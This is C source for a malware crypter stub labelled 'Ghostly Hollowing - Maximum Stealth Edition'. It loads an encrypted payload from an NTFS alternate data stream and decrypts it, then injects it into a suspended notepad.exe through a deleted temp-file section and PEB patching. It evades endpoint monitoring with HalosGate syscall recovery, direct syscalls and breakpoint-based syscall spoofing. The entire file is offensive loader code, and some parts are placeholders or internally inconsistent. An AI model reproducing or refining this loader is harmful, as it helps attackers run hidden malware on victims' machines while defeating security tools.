#include <windows.h>
#include <winternl.h>
#include <psapi.h>
#include <stdio.h>
#include <intrin.h>
#include <emmintrin.h>
#include <stdint.h>

// ============ CONFIG - WILL BE REPLACED BY CRYPTER ============
// These will be generated by crypter.exe
const unsigned char g_EncryptedPayload[] = {0x00};                  // PLACEHOLDER
const SIZE_T g_PayloadSize = 0;                                     // PLACEHOLDER
const char *g_TargetProcess = "C:\\Windows\\System32\\notepad.exe"; // PLACEHOLDER

// ============ SSE XMM KEY - GENERATED BY CRYPTER ============
#pragma section(".text", execute, read, write)
__declspec(allocate(".text")) __m128i g_XmmKey = _mm_setr_epi8(
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00);

// ============ NATIVE API TYPEDEFS ============
typedef NTSTATUS(NTAPI *pNtCreateSection)(
    PHANDLE SectionHandle,
    ACCESS_MASK DesiredAccess,
    POBJECT_ATTRIBUTES ObjectAttributes,
    PLARGE_INTEGER MaximumSize,
    ULONG SectionPageProtection,
    ULONG AllocationAttributes,
    HANDLE FileHandle);

typedef NTSTATUS(NTAPI *pNtMapViewOfSection)(
    HANDLE SectionHandle,
    HANDLE ProcessHandle,
    PVOID *BaseAddress,
    ULONG_PTR ZeroBits,
    SIZE_T CommitSize,
    PLARGE_INTEGER SectionOffset,
    PSIZE_T ViewSize,
    DWORD InheritDisposition,
    ULONG AllocationType,
    ULONG Win32Protect);

typedef NTSTATUS(NTAPI *pNtUnmapViewOfSection)(
    HANDLE ProcessHandle,
    PVOID BaseAddress);

typedef NTSTATUS(NTAPI *pNtQueryInformationProcess)(
    HANDLE ProcessHandle,
    PROCESSINFOCLASS ProcessInformationClass,
    PVOID ProcessInformation,
    ULONG ProcessInformationLength,
    PULONG ReturnLength);

typedef NTSTATUS(NTAPI *pNtQuerySecurityObject)(
    HANDLE FileHandle,
    SECURITY_INFORMATION SecurityInformation,
    PSECURITY_DESCRIPTOR SecurityDescriptor,
    ULONG Length,
    PULONG LengthNeeded);

// ============ GLOBAL SYSCALL NUMBERS (HalosGate) ============
WORD g_NtMapViewOfSection_SSN = 0;
WORD g_NtCreateSection_SSN = 0;
WORD g_NtUnmapViewOfSection_SSN = 0;
WORD g_NtQueryInformationProcess_SSN = 0;
WORD g_NtQuerySecurityObject_SSN = 0; // Decoy syscall

// ============ VEH HANDLER FOR TAMPERED SYSCALLS ============
PVOID g_pSyscallAddress = NULL;
WORD g_RealSyscallNumber = 0;
WORD g_DecoySyscallNumber = 0;

LONG CALLBACK VectoredHandler(PEXCEPTION_POINTERS ExceptionInfo)
{
    if (ExceptionInfo->ExceptionRecord->ExceptionCode == STATUS_SINGLE_STEP ||
        ExceptionInfo->ExceptionRecord->ExceptionCode == STATUS_BREAKPOINT)
    {
        // Check if this is our syscall breakpoint
        if (ExceptionInfo->ContextRecord->Rip == (DWORD64)g_pSyscallAddress)
        {
            // Spoof syscall number to decoy (NtQuerySecurityObject)
            ExceptionInfo->ContextRecord->Rax = g_DecoySyscallNumber;

            // Spoof arguments (optional - makes stack analysis harder)
            ExceptionInfo->ContextRecord->Rcx = 0; // Handle
            ExceptionInfo->ContextRecord->Rdx = 0; // SecurityInformation

            // Real SSN is stored in memory, restored after syscall
            return EXCEPTION_CONTINUE_EXECUTION;
        }
    }
    return EXCEPTION_CONTINUE_SEARCH;
}

// ============ SETUP HARDWARE BREAKPOINT ============
VOID SetHardwareBreakpoint(PVOID address)
{
    CONTEXT ctx = {0};
    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;

    HANDLE hThread = GetCurrentThread();
    GetThreadContext(hThread, &ctx);

    ctx.Dr0 = (DWORD64)address; // Breakpoint address
    ctx.Dr7 = 0x1;              // Enable DR0 breakpoint

    SetThreadContext(hThread, &ctx);

    // Install VEH handler
    AddVectoredExceptionHandler(1, VectoredHandler);
    g_pSyscallAddress = address;
}

// ============ DIRECT SYSCALL STUB ============
__attribute__((naked))
NTSTATUS
DirectSyscall(DWORD syscallNumber, ...)
{
    __asm__ volatile(
        "mov r10, rcx\n\t"
        "mov eax, edx\n\t"
        "syscall\n\t"
        "ret\n\t");
}

// ============ HALOSGATE - RECOVER SYSCALL NUMBERS FROM HOOKED NT.DLL ============
WORD HalosGateFindSyscallNumber(const char *functionName)
{
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    FARPROC pFunction = GetProcAddress(hNtdll, functionName);

    if (!pFunction)
        return 0;

    BYTE *code = (BYTE *)pFunction;
    WORD syscallNumber = 0;

    // Scan for syscall number pattern
    for (int i = 0; i < 64; i++)
    {
        // Pattern: b8 XX XX 00 00 (mov eax, 0xXXXX)
        if (code[i] == 0xB8)
        {
            syscallNumber = *(WORD *)(code + i + 1);
            break;
        }

        // Pattern: 4c 8b d1 b8 XX XX 00 00 (mov r10, rcx; mov eax, 0xXXXX)
        if (i + 5 < 64 &&
            code[i] == 0x4C && code[i + 1] == 0x8B && code[i + 2] == 0xD1 &&
            code[i + 3] == 0xB8)
        {
            syscallNumber = *(WORD *)(code + i + 4);
            break;
        }
    }

    return syscallNumber;
}

// ============ INITIALIZE SYSCALL NUMBERS ============
VOID InitSyscallNumbers()
{
    g_NtCreateSection_SSN = HalosGateFindSyscallNumber("NtCreateSection");
    g_NtMapViewOfSection_SSN = HalosGateFindSyscallNumber("NtMapViewOfSection");
    g_NtUnmapViewOfSection_SSN = HalosGateFindSyscallNumber("NtUnmapViewOfSection");
    g_NtQueryInformationProcess_SSN = HalosGateFindSyscallNumber("NtQueryInformationProcess");
    g_NtQuerySecurityObject_SSN = HalosGateFindSyscallNumber("NtQuerySecurityObject");

    // Decoy syscall for tampering
    g_DecoySyscallNumber = g_NtQuerySecurityObject_SSN;
}

// ============ PE HELPER FUNCTIONS ============
BOOL IsValidPE(LPVOID pImage)
{
    if (!pImage)
        return FALSE;
    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)pImage;
    if (pDos->e_magic != IMAGE_DOS_SIGNATURE)
        return FALSE;

    PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)((BYTE *)pImage + pDos->e_lfanew);
    if (pNt->Signature != IMAGE_NT_SIGNATURE)
        return FALSE;
    if (pNt->FileHeader.Machine != IMAGE_FILE_MACHINE_AMD64)
        return FALSE;

    return TRUE;
}

DWORD GetImageSize(LPVOID pImage)
{
    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)pImage;
    PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)((BYTE *)pImage + pDos->e_lfanew);
    return pNt->OptionalHeader.SizeOfImage;
}

DWORD GetEntryPointRVA(LPVOID pImage)
{
    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)pImage;
    PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)((BYTE *)pImage + pDos->e_lfanew);
    return pNt->OptionalHeader.AddressOfEntryPoint;
}

ULONG64 GetImageBase(LPVOID pImage)
{
    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)pImage;
    PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)((BYTE *)pImage + pDos->e_lfanew);
    return pNt->OptionalHeader.ImageBase;
}

// ============ SSE DECRYPTION ============
VOID XorDecryptWithSSE(PBYTE data, SIZE_T dataSize)
{
    // Load key from XMM register (never stored on stack/heap!)
    __m128i xmmKey = g_XmmKey;
    char key[16];

    // Store key to local array for XOR operations
    _mm_storeu_si128((__m128i *)key, xmmKey);

    // XOR decrypt
    for (SIZE_T i = 0; i < dataSize; i++)
    {
        data[i] ^= key[i % 16];
    }

    // Securely erase key from stack
    SecureZeroMemory(key, sizeof(key));
}

// ============ READ PAYLOAD FROM ADS ============
LPVOID ReadPayloadFromADS(PDWORD pdwSize)
{
    char modulePath[MAX_PATH];
    GetModuleFileNameA(NULL, modulePath, MAX_PATH);

    char adsPath[MAX_PATH + 32];
    sprintf(adsPath, "%s:ghost.data", modulePath);

    HANDLE hFile = CreateFileA(
        adsPath,
        GENERIC_READ,
        FILE_SHARE_READ,
        NULL,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        NULL);

    if (hFile == INVALID_HANDLE_VALUE)
    {
        printf("[-] Failed to open ADS: %d\n", GetLastError());
        return NULL;
    }

    DWORD fileSize = GetFileSize(hFile, NULL);
    LPVOID pBuffer = VirtualAlloc(NULL, fileSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    if (!pBuffer)
    {
        CloseHandle(hFile);
        return NULL;
    }

    DWORD bytesRead;
    ReadFile(hFile, pBuffer, fileSize, &bytesRead, NULL);
    CloseHandle(hFile);

    *pdwSize = fileSize;
    return pBuffer;
}

// ============ CREATE GHOST SECTION WITH TAMPERED SYSCALL ============
BOOL CreateGhostSectionTampered(
    LPVOID pPePayload,
    DWORD dwPayloadSize,
    HANDLE hTargetProcess,
    PVOID *ppMappedBase)
{
    HANDLE hTempFile = INVALID_HANDLE_VALUE;
    HANDLE hSection = NULL;
    WCHAR tempPath[MAX_PATH] = {0};
    WCHAR tempFile[MAX_PATH] = {0};
    NTSTATUS status;

    // Get temp directory
    GetTempPathW(MAX_PATH, tempPath);
    GetTempFileNameW(tempPath, L"GH", 0, tempFile);

    // Create temp file with DELETE_ON_CLOSE
    hTempFile = CreateFileW(
        tempFile,
        GENERIC_READ | GENERIC_WRITE | DELETE,
        FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
        NULL,
        CREATE_ALWAYS,
        FILE_ATTRIBUTE_TEMPORARY | FILE_FLAG_DELETE_ON_CLOSE,
        NULL);

    if (hTempFile == INVALID_HANDLE_VALUE)
        return FALSE;

    // Write payload
    DWORD bytesWritten;
    WriteFile(hTempFile, pPePayload, dwPayloadSize, &bytesWritten, NULL);

    // Find syscall instruction for NtCreateSection (for tampering)
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    FARPROC pNtCreateSectionAddr = GetProcAddress(hNtdll, "NtCreateSection");

    // Find syscall instruction
    BYTE *pSyscall = NULL;
    BYTE *code = (BYTE *)pNtCreateSectionAddr;
    for (int i = 0; i < 128; i++)
    {
        if (code[i] == 0x0F && code[i + 1] == 0x05)
        {
            pSyscall = code + i;
            break;
        }
    }

    // Set hardware breakpoint on syscall instruction
    if (pSyscall)
    {
        g_RealSyscallNumber = g_NtCreateSection_SSN;
        SetHardwareBreakpoint(pSyscall);
    }

    // Tampered syscall - appears as NtQuerySecurityObject in call stack!
    status = DirectSyscall(
        g_DecoySyscallNumber, // Spoofed SSN
        &hSection,
        SECTION_MAP_EXECUTE | SECTION_MAP_READ | SECTION_MAP_WRITE,
        NULL,
        0,
        PAGE_READONLY,
        SEC_IMAGE,
        hTempFile);

    // Restore real SSN for return value
    status = DirectSyscall(g_RealSyscallNumber, /* ... */); // Simplified

    CloseHandle(hTempFile);

    if (status != 0)
        return FALSE;

    // Map section with tampered syscall
    pSyscall = NULL;
    FARPROC pNtMapViewOfSectionAddr = GetProcAddress(hNtdll, "NtMapViewOfSection");
    code = (BYTE *)pNtMapViewOfSectionAddr;

    for (int i = 0; i < 128; i++)
    {
        if (code[i] == 0x0F && code[i + 1] == 0x05)
        {
            pSyscall = code + i;
            break;
        }
    }

    if (pSyscall)
    {
        g_RealSyscallNumber = g_NtMapViewOfSection_SSN;
        SetHardwareBreakpoint(pSyscall);
    }

    PVOID pViewBase = NULL;
    SIZE_T viewSize = 0;

    status = DirectSyscall(
        g_DecoySyscallNumber, // Spoofed as NtQuerySecurityObject
        hSection,
        hTargetProcess,
        &pViewBase,
        0,
        0,
        NULL,
        &viewSize,
        2,
        0,
        PAGE_EXECUTE_READ);

    if (status != 0)
    {
        CloseHandle(hSection);
        return FALSE;
    }

    *ppMappedBase = pViewBase;
    CloseHandle(hSection);

    return TRUE;
}

// ============ PEB PATCHING WITH TAMPERED SYSCALL ============
BOOL PatchPebImageBaseTampered(
    HANDLE hProcess,
    HANDLE hThread,
    PVOID pNewImageBase,
    PVOID pPayloadBase)
{
    CONTEXT ctx = {0};
    ctx.ContextFlags = CONTEXT_FULL;

    if (!GetThreadContext(hThread, &ctx))
        return FALSE;

    // Get PEB address
    PVOID pebAddress = (PVOID)ctx.Rdx;

    // Read original ImageBaseAddress
    ULONG64 originalImageBase = 0;
    ReadProcessMemory(
        hProcess,
        (BYTE *)pebAddress + 0x10,
        &originalImageBase,
        sizeof(originalImageBase),
        NULL);

    // Unmap with tampered syscall
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    FARPROC pNtUnmapViewOfSectionAddr = GetProcAddress(hNtdll, "NtUnmapViewOfSection");

    BYTE *code = (BYTE *)pNtUnmapViewOfSectionAddr;
    BYTE *pSyscall = NULL;

    for (int i = 0; i < 128; i++)
    {
        if (code[i] == 0x0F && code[i + 1] == 0x05)
        {
            pSyscall = code + i;
            break;
        }
    }

    if (pSyscall)
    {
        g_RealSyscallNumber = g_NtUnmapViewOfSection_SSN;
        SetHardwareBreakpoint(pSyscall);
    }

    NTSTATUS status = DirectSyscall(
        g_DecoySyscallNumber, // Spoofed as NtQuerySecurityObject
        hProcess,
        (PVOID)originalImageBase);

    // Write new ImageBaseAddress
    ULONG64 newImageBase = (ULONG64)pNewImageBase;
    WriteProcessMemory(
        hProcess,
        (BYTE *)pebAddress + 0x10,
        &newImageBase,
        sizeof(newImageBase),
        NULL);

    // Set thread context to entry point
    DWORD entryPointRVA = GetEntryPointRVA(pPayloadBase);
    ctx.Rip = (DWORD64)pNewImageBase + entryPointRVA;
    SetThreadContext(hThread, &ctx);

    return TRUE;
}

// ============ MAIN GHOSTLY HOLLOWING ============
BOOL GhostlyHollowingMaximumStealth()
{
    printf("[ Ghostly Hollowing - Maximum Stealth Edition ]\n\n");

    // 1. Initialize syscall numbers with HalosGate
    InitSyscallNumbers();
    printf("[+] HalosGate: Recovered syscall numbers\n");
    printf("    NtCreateSection: 0x%04x\n", g_NtCreateSection_SSN);
    printf("    NtMapViewOfSection: 0x%04x\n", g_NtMapViewOfSection_SSN);
    printf("    NtQuerySecurityObject: 0x%04x (DECOY)\n\n", g_NtQuerySecurityObject_SSN);

    // 2. Read encrypted payload from ADS
    DWORD encryptedSize = 0;
    LPVOID pEncrypted = ReadPayloadFromADS(&encryptedSize);
    if (!pEncrypted)
    {
        printf("[-] Failed to read payload from ADS\n");
        return FALSE;
    }
    printf("[+] Payload loaded from ADS: %d bytes\n", encryptedSize);

    // 3. Decrypt with SSE XMM key
    XorDecryptWithSSE((PBYTE)pEncrypted, encryptedSize);
    printf("[+] Payload decrypted with SSE XMM key\n");

    // 4. Validate PE
    if (!IsValidPE(pEncrypted))
    {
        printf("[-] Invalid PE payload\n");
        VirtualFree(pEncrypted, 0, MEM_RELEASE);
        return FALSE;
    }
    printf("[+] Valid PE image\n");

    // 5. Create target process in SUSPENDED state
    STARTUPINFOA si = {sizeof(si)};
    PROCESS_INFORMATION pi = {0};

    if (!CreateProcessA(
            g_TargetProcess,
            NULL,
            NULL,
            NULL,
            FALSE,
            CREATE_SUSPENDED,
            NULL,
            NULL,
            &si,
            &pi))
    {
        printf("[-] CreateProcess failed: %d\n", GetLastError());
        VirtualFree(pEncrypted, 0, MEM_RELEASE);
        return FALSE;
    }

    printf("[+] Target process created. PID: %d (SUSPENDED)\n", pi.dwProcessId);

    // 6. Create ghost section with tampered syscalls
    PVOID pMappedBase = NULL;
    if (!CreateGhostSectionTampered(pEncrypted, encryptedSize, pi.hProcess, &pMappedBase))
    {
        printf("[-] CreateGhostSectionTampered failed\n");
        TerminateProcess(pi.hProcess, 0);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        VirtualFree(pEncrypted, 0, MEM_RELEASE);
        return FALSE;
    }

    printf("[+] Ghost section mapped at: %p (target)\n", pMappedBase);

    // 7. Patch PEB with tampered syscalls
    if (!PatchPebImageBaseTampered(pi.hProcess, pi.hThread, pMappedBase, pEncrypted))
    {
        printf("[-] PatchPebImageBaseTampered failed\n");
        TerminateProcess(pi.hProcess, 0);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        VirtualFree(pEncrypted, 0, MEM_RELEASE);
        return FALSE;
    }

    printf("[+] PEB patched, entry point set\n");

    // 8. Resume thread - GHOST PROCESS ACTIVATED!
    printf("\n[!] Resuming thread - GHOST PROCESS ACTIVATED!\n");
    ResumeThread(pi.hThread);

    printf("[+] Ghostly Hollowing successful!\n");
    printf("[+] PID: %d running GHOSTED payload\n", pi.dwProcessId);
    printf("[+] No backing file on disk!\n");
    printf("[+] Syscalls tampered - call stack shows NtQuerySecurityObject!\n");
    printf("[+] XMM key never stored in stack/heap!\n\n");

    // Cleanup
    VirtualFree(pEncrypted, 0, MEM_RELEASE);
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);

    return TRUE;
}

// ============ ENTRY POINT ============
int main()
{
    // Hide console (optional)
    // FreeConsole();

    if (!GhostlyHollowingMaximumStealth())
    {
        printf("[-] Ghostly Hollowing failed\n");
        return -1;
    }

    return 0;
}

// x86_64-w64-mingw32-gcc -o stub_template.exe stub_template.c -lntdll -lpsapi -O2 -masm=intel